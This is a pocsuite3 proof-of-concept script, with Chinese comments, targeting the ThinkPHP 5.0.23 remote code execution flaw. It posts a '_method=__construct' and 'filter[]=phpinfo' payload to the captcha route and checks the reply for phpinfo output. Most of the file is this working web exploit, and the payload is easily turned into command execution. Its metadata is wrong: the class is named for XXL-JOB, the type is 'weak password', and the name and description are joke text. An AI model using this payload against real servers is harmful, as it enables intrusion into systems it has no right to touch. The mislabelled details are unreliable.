from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "七七太棒了"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "thinkphp"  # 漏洞应用名称
    appVersion = "Thinkphp5 5.0.23"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """七七超级可爱"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码

        url = f"{self.url}/index.php?s=captcha"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.1.90:8080", "Connection": "close", "Referer": "http://192.168.1.90:8080/index.php?s=captcha", "Upgrade-Insecure-Requests": "1"}
        data = {"_method": "__construct", "filter[]": "phpinfo", "method": "get", "server[REQUEST_METHOD]": "-1"}
        

        result = []
        try:
            res = requests.post(url, headers=headers, data=data)
            flag = 'PHP Version'
            flag2 = 'disable_functions'
            # 判断是否存在漏洞
            if flag in res.text and flag2 in res.text:
                print(f"{self.url} 存在漏洞")
                result.append(url)
        except Exception as e:
            pass
        finally:
            return result

            
    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
